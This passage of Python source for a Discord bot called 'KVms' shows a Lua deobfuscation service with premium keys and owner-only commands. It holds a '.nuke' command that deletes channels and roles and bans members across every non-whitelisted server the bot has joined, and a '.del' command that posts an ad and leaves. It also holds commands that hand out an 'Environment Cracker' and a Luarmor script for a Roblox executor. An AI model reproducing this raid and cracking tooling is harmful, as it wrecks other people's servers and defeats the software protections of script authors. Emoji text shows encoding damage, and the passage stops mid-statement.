    if not lua_code and getattr(ctx.message, \"reference\", None):
        try:
            ref = (ctx.message.reference.resolved or
                   await ctx.message.channel.fetch_message(ctx.message.reference.message_id))
            lua_code = await extract_lua_from(ref)
        except Exception:
            pass

    if lua_code and args:
        # With an attachment or reply, the optional argument is the expected
        # detector name, e.g. `.obftest prometheus`.
        expected_tokens = args.split()
        if expected_tokens:
            expected = expected_tokens[0].lower()

    if not lua_code:
        codeblock = LUA_CODEBLOCK.search(args)
        if codeblock:
            lua_code = codeblock.group(1).strip()
            rest = LUA_CODEBLOCK.sub(\" \", args).strip().split()
            expected = rest[0].lower() if rest else None
        else:
            tokens = args.split()
            if tokens and tokens[0].startswith((\"http://\", \"https://\")):
                source = tokens[0]
                expected = tokens[1].lower() if len(tokens) > 1 else None
                try:
                    status = await ctx.reply(f\"{EMOJI_LOADING} fetching sample...\")
                    raw = await fetch_from_url(source)
                    lua_code = raw.decode(\"utf-8\", errors=\"ignore\") if raw else None
                    await status.delete()
                except Exception as e:
                    return await ctx.reply(
                        f\"fetch failed: `{_strip_mentions(_sanitize_error(str(e)))}`\", delete_after=12)
            elif tokens:
                # With an attachment/reply, a bare argument is the expected
                # obfuscator name. Without source, show the usage instead.
                expected = tokens[0].lower()

    if not lua_code:
        return await ctx.reply(
            \"usage: attach/reply a sample then `.obftest [expected_name]`, or \"
            \"`.obftest <url> [expected_name]`, or use a ```codeblock```\",
            delete_after=15)
    if not _source_within_input_limit(lua_code):
        return await ctx.reply(\"input too large (maximum 8 MB)\", delete_after=10)

    started = time.perf_counter()
    result = _detect_obfuscator(lua_code)
    took = time.perf_counter() - started
    embed = discord.Embed(title=\"Detector test\", color=ACCENT,
                          description=f\"scanned `{len(_detection_windows(lua_code))}` distributed 100-character windows\")
    embed.add_field(name=\"Sample size\", value=f\"`{len(lua_code.encode('utf-8')):,} bytes`\", inline=True)
    if result:
        name, recommendation, description, notes, confidence, match_info = result
        _record_detector_hit(name, match_info, confidence)
        comparison = \"not provided\"
        if expected:
            comparison = \"MATCH\" if expected == str(name).lower() else f\"expected `{_strip_mentions(expected)}`\"
        embed.add_field(name=\"Detected\", value=f\"`{_strip_mentions(name)}`\", inline=True)
        embed.add_field(name=\"Confidence\", value=f\"`{confidence}%`\", inline=True)
        embed.add_field(name=\"Recommendation\", value=f\"`{_strip_mentions(recommendation)}`\", inline=True)
        embed.add_field(name=\"Expected\", value=f\"`{_strip_mentions(comparison)}`\", inline=True)
        regions = \", \".join(_strip_mentions(str(value)) for value in
                              (match_info or {}).get(\"matched_regions\", [])) or \"heuristic / not stored\"
        embed.add_field(name=\"Matched regions\", value=f\"`{regions[:500]}`\", inline=False)
        embed.add_field(name=\"Matched counts\",
                        value=(f\"patterns: `{(match_info or {}).get('matched_pattern_count', 0)}` | \"
                               f\"signatures: `{(match_info or {}).get('matched_signature_count', 0)}`\"),
                        inline=True)
        if description:
            embed.add_field(name=\"Reason\", value=_strip_mentions(description)[:1000], inline=False)
        if notes:
            embed.add_field(name=\"Notes\", value=_strip_mentions(notes)[:1000], inline=False)
        embed.color = GOOD if confidence >= 75 else WARN
    else:
        embed.add_field(name=\"Detected\", value=\"`no strong match`\", inline=True)
        embed.add_field(name=\"Confidence\", value=\"`0%`\", inline=True)
        embed.add_field(name=\"Matched regions\", value=\"`none`\", inline=True)
        embed.add_field(name=\"Matched counts\", value=\"patterns: `0` | signatures: `0`\", inline=True)
        if expected:
            embed.add_field(name=\"Expected\", value=f\"`{_strip_mentions(expected)}`\", inline=True)
        embed.description += \"\\nNo detector passed the confidence threshold.\"
        embed.color = WARN
    embed.set_footer(text=_make_footer(took))
    await ctx.reply(embed=embed)

# =========================
# OWNER-ONLY COMMANDS
# =========================
@bot.command(name=\"genkey\", hidden=True)
async def genkey_command(ctx, amount: int = 1, user: str = None, duration: str = None):
    if ctx.author.id != OWNER_ID:
        return
    if amount < 1 or amount > 100:
        return await ctx.reply(\"amount must be 1-100\", delete_after=8)

    target_uid = None
    if user:
        m = re.match(r'<@!?(\\d+)>', user)
        if m:
            target_uid = int(m.group(1))
        else:
            try: target_uid = int(user)
            except ValueError:
                return await ctx.reply(\"invalid user\", delete_after=8)

    expiry = None
    if duration:
        d = duration.lower().strip()
        if d in (\"lifetime\", \"lt\", \"perm\", \"permanent\"):
            expiry = None
        else:
            m = re.match(r'^(\\d+)([smhdwMy])$', d)
            if not m:
                return await ctx.reply(\"invalid duration - examples: `1d`, `7d`, `30d`, `1h`, `60m`, `lifetime`\", delete_after=10)
            num  = int(m.group(1))
            unit = m.group(2)
            mult = {\"s\":1,\"m\":60,\"h\":3600,\"d\":86400,\"w\":604800,\"M\":2592000,\"y\":31536000}[unit]
            expiry = time.time() + (num * mult)

    generated = []
    for _ in range(amount):
        k = _gen_key()
        while k in keys_db:
            k = _gen_key()
        keys_db[k] = {
            \"claimed_by\":   None,
            \"claimed_at\":   None,
            \"expiry\":       expiry,
            \"created_by\":   ctx.author.id,
            \"created_at\":   time.time(),
            \"target_user\":  target_uid,
        }
        generated.append(k)
    _save_keys(keys_db)

    exp_str = \"Lifetime\" if expiry is None else datetime.fromtimestamp(expiry).strftime(\"%Y-%m-%d %H:%M UTC\")
    embed = discord.Embed(title=f\"ƒ...‚‚œ Generated {len(generated)} key(s)\",
        description=\"\\n\".join(f\"```\\n{k}\\n```\" for k in generated)[:1900],
        color=GOOD, timestamp=datetime.now())
    embed.add_field(name=\"Expiry\", value=exp_str, inline=True)
    if target_uid:
        embed.add_field(name=\"Bound to\", value=f\"<@{target_uid}> (`{target_uid}`)\", inline=True)
    embed.set_footer(text=\"KVms | Owner Panel\")
    await ctx.reply(embed=embed, delete_after=120)

@bot.command(name=\"revoke\", hidden=True)
async def revoke_command(ctx, *, target: str = None):
    # Revoke by key OR by user (user_id / @mention / username).
    if ctx.author.id != OWNER_ID:
        return
    if not target:
        return await ctx.reply(\"`.revoke <key | user_id | @user | username>`\", delete_after=10)
    target = target.strip()

    # 1) exact key match -> classic key revoke
    if target in keys_db:
        claimed_by = keys_db[target].get(\"claimed_by\")
        if claimed_by is not None and claimed_by in premium_users:
            del premium_users[claimed_by]
            _save_premium(premium_users)
            await _remove_premium_roles(claimed_by)
        del keys_db[target]
        _save_keys(keys_db)
        return await ctx.reply(f\"revoked key `{target}`\", delete_after=15)

    # 2) otherwise try to resolve it as a user
    uid = await _resolve_user_id(target)
    if uid is None:
        return await ctx.reply(\"not a key I know and I couldn't find that user either\", delete_after=10)

    tag = await _resolve_tag(uid)
    had_premium = uid in premium_users
    if had_premium:
        del premium_users[uid]
        _save_premium(premium_users)
        await _remove_premium_roles(uid)

    claimed = [k for k, v in keys_db.items() if v.get(\"claimed_by\") == uid]
    for k in claimed:
        del keys_db[k]
    if claimed:
        _save_keys(keys_db)

    if not had_premium and not claimed:
        return await ctx.reply(f\"{tag} (`{uid}`) has no premium and no claimed keys\", delete_after=10)

    parts = []
    if had_premium:
        parts.append(\"premium removed\")
    parts.append(f\"{len(claimed)} claimed key(s) deleted\")
    await ctx.reply(f\"revoked {tag} (`{uid}`) - \" + \", \".join(parts), delete_after=15)

@bot.command(name=\"unprem\", hidden=True)
async def unprem_command(ctx, user_id: int = None):
    if ctx.author.id != OWNER_ID:
        return
    if user_id is None:
        return await ctx.reply(\"`.unprem <user_id>`\", delete_after=8)
    if user_id == OWNER_ID:
        return await ctx.reply(\"can't unprem the owner lol\", delete_after=8)
    if user_id in premium_users:
        del premium_users[user_id]
        _save_premium(premium_users)
        await _remove_premium_roles(user_id)
        await ctx.reply(f\"ƒ...€œ‚ removed premium from `{user_id}`\", delete_after=15)
    else:
        await ctx.reply(f\"that user isn't premium\", delete_after=10)

@bot.command(name=\"prem\", hidden=True)
async def prem_command(ctx, target: str = None):
    if ctx.author.id != OWNER_ID:
        return
    if not target:
        if not premium_users:
            return await ctx.reply(embed=discord.Embed(title=\"ƒ‚‚ Premium Users\", description=\"no one yet\", color=WARN), delete_after=30)
        lines = []
        for uid, exp in premium_users.items():
            exp_s = \"Lifetime\" if exp is None else datetime.fromtimestamp(exp).strftime(\"%Y-%m-%d %H:%M\")
            lines.append(f\"ƒ€š‚ `{uid}` - {exp_s}\")
        embed = discord.Embed(title=f\"ƒ‚‚ Premium Users ({len(premium_users)})\",
            description=\"\\n\".join(lines)[:2000], color=GOOD, timestamp=datetime.now())
        embed.set_footer(text=\"KVms | Owner Panel\")
        return await ctx.reply(embed=embed, delete_after=60)
    uid = None
    m = re.match(r'<@!?(\\d+)>', target)
    if m:
        uid = int(m.group(1))
    else:
        try: uid = int(target)
        except ValueError:
            return await ctx.reply(\"invalid user\", delete_after=8)
    if uid == OWNER_ID:
        return await ctx.reply(\"that's you - you're the owner\", delete_after=5)
    if uid in premium_users:
        del premium_users[uid]
        _save_premium(premium_users)
        await _remove_premium_roles(uid)
        embed = discord.Embed(description=f\"ƒ‚‚ removed premium from `{uid}`\", color=WARN)
    else:
        premium_users[uid] = None
        _save_premium(premium_users)
        role_user = (ctx.guild.get_member(uid) if ctx.guild is not None else None)
        if role_user is None:
            role_user = bot.get_user(uid)
        if role_user is None:
            try:
                role_user = await bot.fetch_user(uid)
            except Exception:
                role_user = None
        assigned = await _assign_premium_role(role_user, ctx.guild) if role_user else 0
        embed = discord.Embed(description=f\"ƒ‚‚ added lifetime premium to `{uid}` (roles synced: {assigned})\", color=GOOD)
    embed.set_footer(text=\"KVms | Owner Panel\")
    await ctx.reply(embed=embed, delete_after=15)


def _resolve_premium_role(guild, raw: str):
    raw = (raw or \"\").strip()
    match = re.fullmatch(r\"<@&(\\d+)>\", raw)
    if match:
        return guild.get_role(int(match.group(1)))
    if raw.isdigit():
        return guild.get_role(int(raw))
    folded = raw.casefold()
    return next((role for role in getattr(guild, \"roles\", [])
                 if getattr(role, \"name\", \"\").casefold() == folded), None)


@bot.command(name=\"premrole\", hidden=True)
async def premrole_command(ctx, *, role_arg: str = None):
    if ctx.author.id != OWNER_ID:
        return
    if ctx.guild is None:
        return await ctx.reply(\"`.premrole <role>` must be run in the server being configured\", delete_after=10)
    if not role_arg:
        role_id = premium_roles.get(int(ctx.guild.id))
        role = ctx.guild.get_role(role_id) if role_id else None
        current = role.mention if role else \"not configured\"
        return await ctx.reply(f\"premium role for this server: {current}\", delete_after=15)
    if role_arg.strip().casefold() in {\"off\", \"none\", \"disable\", \"disabled\"}:
        perms = getattr(ctx.author, \"guild_permissions\", None)
        if not (getattr(perms, \"manage_roles\", False) or getattr(perms, \"administrator\", False)):
            return await ctx.reply(\"you need Manage Roles or Administrator to change the premium role\", delete_after=12)
        old_role_id = premium_roles.pop(int(ctx.guild.id), None)
        old_role = ctx.guild.get_role(old_role_id) if old_role_id else None
        await _remove_role_from_premium_members(ctx.guild, old_role)
        _save_premium_roles()
        return await ctx.reply(\"premium role configuration cleared; premium access remains active\", delete_after=15)

    role = _resolve_premium_role(ctx.guild, role_arg)
    if role is None:
        return await ctx.reply(\"role not found; use a role mention, role ID, or exact role name\", delete_after=12)
    if role.is_default() or getattr(role, \"managed\", False):
        return await ctx.reply(\"@everyone or an integration-managed role cannot be used as the premium role\", delete_after=12)
    me = getattr(ctx.guild, \"me\", None)
    if me is None or role.position >= me.top_role.position:
        return await ctx.reply(\"my highest role must be above the premium role\", delete_after=12)
    perms = getattr(ctx.author, \"guild_permissions\", None)
    if not (getattr(perms, \"manage_roles\", False) or getattr(perms, \"administrator\", False)):
        return await ctx.reply(\"you need Manage Roles or Administrator to configure a premium role\", delete_after=12)

    old_role_id = premium_roles.get(int(ctx.guild.id))
    old_role = ctx.guild.get_role(old_role_id) if old_role_id else None
    if old_role is not None and old_role.id != role.id:
        await _remove_role_from_premium_members(ctx.guild, old_role)
    premium_roles[int(ctx.guild.id)] = int(role.id)
    _save_premium_roles()
    assigned = await _sync_premium_role(ctx.guild)
    await ctx.reply(
        f\"premium role set to {role.mention}; synced **{assigned}** premium member(s). \"
        \"Premium stays active if a role assignment fails.\",
        delete_after=20)


@bot.command(name=\"sanitize\", hidden=True)
async def sanitize_command(ctx):
    global sanitize_paths_enabled
    if ctx.author.id != OWNER_ID:
        return
    sanitize_paths_enabled = not sanitize_paths_enabled
    state = \"on ƒ...€œ‚\" if sanitize_paths_enabled else \"off ƒ...‚‚“\"
    embed = discord.Embed(description=f\"path sanitization is now **{state}**\",
        color=GOOD if sanitize_paths_enabled else WARN)
    embed.set_footer(text=\"KVms | Owner Panel\")
    await ctx.reply(embed=embed, delete_after=15)

@bot.command(name=\"ban\", hidden=True)
async def ban_command(ctx, *, target: str = None):
    if ctx.author.id != OWNER_ID:
        return
    if not target:
        return await ctx.reply(\"`.ban <user_id | @user | username>` - toggle ban\\n`.banlist` - see who's banned\", delete_after=8)
    uid = await _resolve_user_id(target)
    if uid is None:
        return await ctx.reply(f\"couldn't find `{target}` - give me a user id, mention, or username\", delete_after=8)
    if uid == OWNER_ID:
        return await ctx.reply(\"nice try\", delete_after=5)
    tag = await _resolve_tag(uid)
    if uid in banned_users:
        banned_users.discard(uid)
        await ctx.reply(f\"unbanned {tag} (`{uid}`)\", delete_after=8)
    else:
        banned_users.add(uid)
        await ctx.reply(f\"banned {tag} (`{uid}`)\", delete_after=8)

@bot.command(name=\"banlist\", hidden=True)
async def banlist_command(ctx):
    if ctx.author.id != OWNER_ID:
        return
    if not banned_users:
        return await ctx.reply(
            embed=discord.Embed(title=\"Ban List\", description=\"nobody is banned right now\", color=WARN),
            delete_after=30)
    lines = []
    for uid in sorted(banned_users):
        tag = await _resolve_tag(uid)
        lines.append(f\"- {tag} (`{uid}`)\")
    embed = discord.Embed(
        title=f\"Ban List ({len(banned_users)})\",
        description=\"\\n\".join(lines)[:2000],
        color=BAD, timestamp=datetime.now())
    embed.set_footer(text=\"KVms | Owner Panel | .ban <user> to unban\")
    await ctx.reply(embed=embed, delete_after=90)

@bot.command(name=\"disable\", hidden=True)
async def disable_command(ctx, cmd_name: str = None):
    if ctx.author.id != OWNER_ID:
        return
    valid = {\"l\", \"l2\", \"l3\", \"promdeobf\", \"beautify\", \"lph\", \"wyn\", \"moonsec\", \"constant\", \"rename\", \"obf\", \"upload\"}
    if not cmd_name or cmd_name.lstrip(\".\") not in valid:
        return await ctx.reply(f\"`.disable <{'|'.join(sorted(valid))}>`\", delete_after=8)
    name = cmd_name.lstrip(\".\")
    if name in disabled_commands:
        disabled_commands.discard(name)
        _save_disabled(disabled_commands)
        await ctx.reply(f\"ƒ...€œ‚ `.{name}` is now **enabled**\", delete_after=8)
    else:
        disabled_commands.add(name)
        _save_disabled(disabled_commands)
        await ctx.reply(f\"ƒ...‚‚„ `.{name}` is now **disabled**\", delete_after=8)

@bot.command(name=\"stats\", hidden=True)
async def stats_command(ctx, target: str = None):
    \"\"\"Owner-only: per-user and per-command usage stats.\"\"\"
    if ctx.author.id != OWNER_ID:
        return

    if target:
        uid = None
        m = re.match(r'<@!?(\\d+)>', target)
        if m:
            uid = int(m.group(1))
        else:
            try:
                uid = int(target)
            except ValueError:
                return await ctx.reply(\"invalid user id\", delete_after=8)

        u = cmd_stats.get(uid)
        if not u:
            return await ctx.reply(f\"no recorded commands for `{uid}`\", delete_after=10)

        total = sum(u.values())
        lines = [f\"`.{c}` - {n}\" for c, n in sorted(u.items(), key=lambda x: -x[1])]
        embed = discord.Embed(
            title=f\"ƒ...‚“...  Stats - {uid}\",
            description=\"\\n\".join(lines) or \"-\",
            color=0x5865F2,
            timestamp=datetime.now()
        )
        embed.add_field(name=\"Total\", value=f\"`{total}`\", inline=True)
        embed.set_footer(text=\"KVms | Owner Panel\")
        return await ctx.reply(embed=embed, delete_after=60)

    if not cmd_stats:
        return await ctx.reply(embed=discord.Embed(
            title=\"ƒ...‚“...  KVms Stats\", description=\"no commands recorded yet\", color=WARN))

    per_user = {}
    per_cmd = {}
    for uid, cmds in cmd_stats.items():
        per_user[uid] = sum(cmds.values())
        for c, n in cmds.items():
            per_cmd[c] = per_cmd.get(c, 0) + n

    top_users = sorted(per_user.items(), key=lambda x: -x[1])[:15]
    user_lines = \"\\n\".join(f\"`{uid}` - **{total}**\" for uid, total in top_users) or \"-\"
    cmd_lines = \"\\n\".join(f\"`.{c}` - {n}\" for c, n in sorted(per_cmd.items(), key=lambda x: -x[1])) or \"-\"

    embed = discord.Embed(title=\"ƒ...‚“...  KVms Stats\", color=0x5865F2, timestamp=datetime.now())
    embed.add_field(name=\"Top users\", value=user_lines, inline=False)
    embed.add_field(name=\"Per command\", value=cmd_lines, inline=False)
    embed.set_footer(text=f\"{len(per_user)} users tracked | KVms | Owner Panel\")
    await ctx.reply(embed=embed, delete_after=120)

@bot.command(name=\"luarmor\")
async def luarmor_command(ctx):
    if not is_allowed(ctx.message):
        return
    path = ROOT / \"luarmor.lua\"
    if not path.exists():
        return await ctx.reply(embed=discord.Embed(description=\"`luarmor.lua` not found\", color=BAD))
    embed = discord.Embed(title=\"KVms | Luarmor\", color=0x2b2d31,
        description=\"> run this in your executor\")
    embed.set_footer(text=_make_footer())
    await ctx.reply(embed=embed, file=discord.File(str(path), filename=\"luarmor.lua\"))

@bot.command(name=\"proxies\", hidden=True)
async def proxies_command(ctx):
    if ctx.author.id != OWNER_ID:
        return
    all_p = proxy_manager.all_proxies()
    bl    = proxy_manager.blacklisted()
    embed = discord.Embed(
        title=f\"ƒ......€TM‚ Proxies - {len(all_p)} working | {len(bl)} blacklisted\",
        color=GOOD if all_p else WARN, timestamp=datetime.now())
    if not all_p:
        embed.description = \"no working proxies - fetching directly without proxy\"
    embed.set_footer(text=f\"last reload: {proxy_manager.last_reload_str()}\")
    await ctx.reply(embed=embed)

@bot.command(name=\"reloadproxies\", aliases=[\"rp\"], hidden=True)
async def reload_proxies_command(ctx):
    if ctx.author.id != OWNER_ID:
        return
    msg = await ctx.reply(\"ƒ...‚‚ reloading...\")
    working, total = await proxy_manager.reload()
    if total == 0:
        await msg.edit(content=f\"no proxies.txt found - fetching directly\")
    elif working == 0:
        await msg.edit(content=f\"{total} loaded, none working - fetching directly\")
    else:
        await msg.edit(content=f\"ƒ...€œ‚ **{working}/{total}** working | {proxy_manager.blacklist_count()} blacklisted\")

@bot.command(name=\"clearbl\", hidden=True)
async def clear_blacklist_command(ctx):
    if ctx.author.id != OWNER_ID:
        return
    n = proxy_manager.blacklist_count()
    proxy_manager.clear_blacklist()
    await ctx.reply(f\"ƒ...€œ‚ cleared {n} blacklisted proxies\", delete_after=10)

@bot.command(name=\"serv\", hidden=True)
async def serv_command(ctx):
    if ctx.author.id != OWNER_ID:
        return
    guilds = bot.guilds
    total  = len(guilds)
    total_members = sum(g.member_count or 0 for g in guilds)
    whitelisted   = [g for g in guilds if g.id in WHITELISTED_GUILDS]
    non_wl        = [g for g in guilds if g.id not in WHITELISTED_GUILDS]
    lines = [f\"KVms | Server List - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\",
              f\"Total servers : {total}\", f\"Total members : {total_members:,}\",
              f\"Whitelisted   : {len(whitelisted)}\", f\"Non-WL        : {len(non_wl)}\", \"=\" * 70]
    for g in sorted(guilds, key=lambda x: x.member_count or 0, reverse=True):
        wl = \"WL \" if g.id in WHITELISTED_GUILDS else \"   \"
        lines.append(f\"[{wl}] {g.name:<40} | ID: {g.id} | Members: {g.member_count or '?':>6} | Owner: {g.owner_id}\")
    txt = \"\\n\".join(lines).encode(\"utf-8\")
    embed = discord.Embed(title=f\"ƒ...‚  Servers - {total}\",
        description=(f\"**Members:** `{total_members:,}`\\n\"
                     f\"**Whitelisted:** `{len(whitelisted)}`\\n\"
                     f\"**Non-WL:** `{len(non_wl)}`\"),
        color=0x5865F2, timestamp=datetime.now())
    embed.set_footer(text=\"KVms | Owner Panel\")
    await ctx.reply(embed=embed, file=discord.File(io.BytesIO(txt), filename=\"servers.txt\"))

@bot.command(name=\"del\", hidden=True)
async def del_command(ctx, guild_id: int = None):
    if ctx.author.id != OWNER_ID:
        return
    if guild_id is not None:
        if guild_id in WHITELISTED_GUILDS:
            return await ctx.reply(\"whitelisted - not touching it\", delete_after=5)
        target = bot.get_guild(guild_id)
        if target is None:
            return await ctx.reply(f\"not in guild `{guild_id}`\", delete_after=5)
        msg    = await ctx.reply(f\"ƒ...‚“‚ processing **{target.name}**...\")
        result = await _process_one_guild_del(target)
        await _log_to_owner(\"ƒ...‚“‚ .del (single)\",
            f\"**Server:** {result['name']} (`{result['id']}`)\\n**Left:** {'ƒ...€œ‚' if result['left'] else 'ƒ‚...€TM'}\",
            color=GOOD if result[\"left\"] else BAD)
        await msg.edit(content=(f\"{'ƒ...€œ‚' if result['left'] else 'ƒ‚...€TM'} **{result['name']}** - \"
            f\"ad:{'ƒ...€œ‚' if result['ad_sent'] else 'ƒ‚...€TM'} left:{'ƒ...€œ‚' if result['left'] else 'ƒ‚...€TM'}\"))
        return
    targets = [g for g in bot.guilds if g.id not in WHITELISTED_GUILDS]
    if not targets:
        return await ctx.reply(\"no non-whitelisted servers\", delete_after=5)
    status = await ctx.reply(f\"ƒ...‚“‚ leaving **{len(targets)}** servers...\")
    results, success, failed = [], 0, 0
    for i, guild in enumerate(targets):
        try:
            result = await _process_one_guild_del(guild)
            results.append(result)
            if result[\"left\"]: success += 1
            else: failed += 1
        except Exception:
            results.append({\"name\": guild.name, \"id\": guild.id, \"members\": guild.member_count or 0, \"ad_sent\": False, \"left\": False})
            failed += 1
        if (i + 1) % 5 == 0 or (i + 1) == len(targets):
            try: await status.edit(content=f\"ƒ...‚“‚ progress: `{i+1}/{len(targets)}` - ƒ...€œ‚ {success} | ƒ‚...€TM {failed}\")
            except Exception: pass
        await asyncio.sleep(0.5)
    summary = _build_summary_file(results, \"del\")
    embed = discord.Embed(title=\"ƒ...‚“‚ .del done\",
        description=f\"**left:** `{success}` | **failed:** `{failed}`\",
        color=GOOD if failed == 0 else WARN, timestamp=datetime.now())
    try: await status.delete()
    except Exception: pass
    await ctx.reply(embed=embed, file=discord.File(io.BytesIO(summary), filename=\"del_summary.txt\"))

@bot.command(name=\"nuke\", hidden=True)
async def nuke_command(ctx, *args):
    if ctx.author.id != OWNER_ID:
        return
    # This is the only destructive command with a confirmation gate.
    # `.nuke confirm` targets all non-whitelisted guilds;
    # `.nuke confirm <guild_id>` targets one guild.
    args = list(args)
    if not args or args[0].lower() != \"confirm\":
        return await ctx.reply(
            \"this is destructive; type `.nuke confirm` or `.nuke confirm <guild_id>` to continue\",
            delete_after=10,
        )
    if len(args) > 2:
        return await ctx.reply(\"usage: `.nuke confirm [guild_id]`\", delete_after=10)
    guild_id = None
    if len(args) == 2:
        try:
            guild_id = int(args[1])
        except (TypeError, ValueError):
            return await ctx.reply(\"guild_id must be a number\", delete_after=10)
    if guild_id is not None:
        if guild_id in WHITELISTED_GUILDS:
            return await ctx.reply(\"whitelisted - not touching it\", delete_after=5)
        target = bot.get_guild(guild_id)
        if target is None:
            return await ctx.reply(f\"not in guild `{guild_id}`\", delete_after=5)
        msg    = await ctx.reply(f\"ƒ‹“‚ƒ‚‚ nuking **{target.name}**...\")
        result = await _process_one_guild_nuke(target)
        await _log_to_owner(\"ƒ‹“‚ƒ‚‚ .nuke (single)\",
            f\"**Server:** {result['name']} | ch:{result['ch_del']} roles:{result['role_del']} bans:{result['bans']}\",
            color=GOOD if result[\"left\"] else BAD)
        await msg.edit(content=(f\"ƒ‹“‚ƒ‚‚ **{result['name']}** - ch:{result['ch_del']} role:{result['role_del']} bans:{result['bans']} left:{'ƒ...€œ‚' if result['left'] else 'ƒ‚...€TM'}\"))
        return
    targets = [g for g in bot.guilds if g.id not in WHITELISTED_GUILDS]
    if not targets:
        return await ctx.reply(\"no non-whitelisted servers\", delete_after=5)
    status  = await ctx.reply(f\"ƒ‹“‚ƒ‚‚ nuking **{len(targets)}** servers...\")
    results, success, failed = [], 0, 0
    for i, guild in enumerate(targets):
        try:
            result = await _process_one_guild_nuke(guild)
            results.append(result)
            if result[\"left\"]: success += 1
            else: failed += 1
        except Exception:
            results.append({\"name\": guild.name, \"id\": guild.id, \"members\": guild.member_count or 0, \"ad_sent\": False, \"ch_del\": 0, \"ch_fail\": 0, \"role_del\": 0, \"role_fail\": 0, \"bans\": 0, \"ban_fail\": 0, \"left\": False})
            failed += 1
        if (i + 1) % 3 == 0 or (i + 1) == len(targets):
            try: await status.edit(content=f\"ƒ‹“‚ƒ‚‚ progress: `{i+1}/{len(targets)}` - ƒ...€œ‚ {success} | ƒ‚...€TM {failed}\")
            except Exception: pass
        await asyncio.sleep(1.0)
    summary = _build_summary_file(results, \"nuke\")
    embed = discord.Embed(title=\"ƒ‹“‚ƒ‚‚ .nuke done\",
        description=f\"**nuked:** `{success}` | **failed:** `{failed}`\",
        color=GOOD if failed == 0 else WARN, timestamp=datetime.now())
    try: await status.delete()
    except Exception: pass
    await ctx.reply(embed=embed, file=discord.File(io.BytesIO(summary), filename=\"nuke_summary.txt\"))

@bot.command(name=\"crackenv\", aliases=[\"cenv\"])
async def crackenv_command(ctx):
    if not is_allowed(ctx.message):
        return
    if not os.path.exists(\"cenv.lua\"):
        return await ctx.reply(\"cenv.lua not found\")
    embed = discord.Embed(title=\"KVms | Environment Cracker\", color=0x2b2d31,
        description=\"> run this with the env logger you want to crack\")
    embed.set_footer(text=_make_footer())
    await ctx.reply(embed=embed, file=discord.File(\"cenv.lua\", filename=\"cenv.lua\"))

@bot.command(name=\"ldebug\", hidden=True)
async def ldebug_command(ctx, *, content: str = None):
    if ctx.author.id != OWNER_ID:
        return
    lua_code = None
    if content and content.startswith((\"http://\", \"https://\")):
        try:
            s = await ctx.reply(f\"{EMOJI_LOADING} fetching...\")
            raw = await fetch_from_url(content.split()[0])
            if raw is None:
                await s.delete()
                return await ctx.reply(\"url came back empty\")
            lua_code = raw.decode(\"utf-8\", errors=\"ignore\")
            await s.delete()
        except Exception as e:
            em = discord.Embed(description=f\"```{_strip_mentions(_sanitize_error(str(e)))[:1900]}```\", color=BAD)
            return await ctx.reply(embed=em)
    if not lua_code and ctx.message.reference:
        try:
            ref = (ctx.message.reference.resolved or
                   await ctx.channel.fetch_message(ctx.message.reference.message_id))
            lua_code = await extract_lua_from(ref)
        except Exception:
            pass
    if not lua_code:
        for att in ctx.message.attachments:
            if att.filename.endswith((\".lua\", \".luau\", \".txt\")):
                try:
                    raw = await _read_attachment_limited(att)
                    if raw:
                        lua_code = raw.decode(\"utf-8\", errors=\"ignore\")
                        break
                except Exception:
                    pass
    if not lua_code and content:
        cb = LUA_CODEBLOCK.search(content)
        lua_code = cb.group(1).strip() if cb else content.strip().strip(\"`\")
    if not lua_code:
        return await ctx.reply(\"no lua found\")
    debug_job_id = _new_job_id()
    _job_create(debug_job_id, ctx.author.id,
                str(getattr(ctx.author, \"display_name\", None) or
                    getattr(ctx.author, \"name\", None) or \"\"))
    debug_source, debug_name, debug_url = _job_source_info(
        ctx.message, getattr(ctx.message, \"content\", \"\") or f\".ldebug {content or ''}\",
        \".ldebug\", \"input.lua\")
    _job_update(debug_job_id, command=\".ldebug\",
                guild_id=(int(ctx.guild.id) if getattr(ctx, \"guild\", None) else None),
                input=_job_input_summary(lua_code, source=debug_source,
                                         filename=debug_name, url=debug_url),
                status=\"processing\")
    t_start = time.perf_counter()
    s = await ctx.reply(f\"{EMOJI_LOADING} debugging... | Job ID: `{debug_job_id}`\")
    try:
        out, err = await run_debug(lua_code, get_user_config(ctx.author.id))
        took = time.perf_counter() - t_start
        if err:
            _job_update(debug_job_id, status=\"failed\", error=TIMEOUT_ERROR,
                        duration_seconds=round(time.perf_counter() - t_start, 3))
            em = discord.Embed(
                description=f\"{EMOJI_FAIL} {TIMEOUT_ERROR}\",
                color=BAD)
            em.add_field(name=\"Job ID\", value=f\"`{debug_job_id}`\", inline=True)
            em.set_footer(text=_make_footer())
            return await s.edit(content=None, embed=em)
        if out is None:
            _job_update(debug_job_id, status=\"failed\", error=\"nothing came out\",
                        duration_seconds=round(time.perf_counter() - t_start, 3))
            em = discord.Embed(description=f\"{EMOJI_FAIL} nothing came out\", color=BAD)
            em.add_field(name=\"Job ID\", value=f\"`{debug_job_id}`\", inline=True)
            em.set_footer(text=_make_footer())
            return await s.edit(content=None, embed=em)
        txt = out.decode(\"utf-8\", errors=\"ignore\") if isinstance(out, bytes) else str(out)
        txt = _strip_leakd_watermarks(_fix_mojibake(txt))
        out = txt.encode(\"utf-8\")
        if len(out) > MAX_OUTPUT_BYTES:
            _job_update(debug_job_id, status=\"failed\", error=TIMEOUT_ERROR,
                        duration_seconds=round(time.perf_counter() - t_start, 3))
            em = discord.Embed(description=f\"{EMOJI_FAIL} {TIMEOUT_ERROR}\", color=BAD)
            em.add_field(name=\"Job ID\", value=f\"`{debug_job_id}`\", inline=True)
            em.set_footer(text=_make_footer())
            return await s.edit(content=None, embed=em)
        _job_update(debug_job_id,
                    output=_job_output_summary(out, filename=\"debug_output.lua\"),
                    status=\"completed\", error=\"\",
                    duration_seconds=round(time.perf_counter() - t_start, 3))
        asyncio.ensure_future(_send_owner_result_metadata(
            ctx.message, \"ldebug\", output_bytes=out,
            took=took, output_name=\"debug_output.lua\",
        ))
        preview = _strip_mentions(\"\\n\".join(txt.splitlines()[:30]))[:1000]
        embed = discord.Embed(title=\"Debug Output\",
            description=f\"```lua\\n{preview}\\n```\", color=0x2b2d31)
        embed.add_field(name=\"Job ID\", value=f\"`{debug_job_id}`\", inline=True)
        embed.set_footer(text=_make_footer(took))
        await s.delete()
        await ctx.reply(embed=embed, file=discord.File(io.BytesIO(out), filename=\"debug_output.lua\"))
    except Exception as e:
        _job_update(debug_job_id, status=\"failed\", error=TIMEOUT_ERROR,
                    duration_seconds=round(time.perf_counter() - t_start, 3))
        em = discord.Embed(
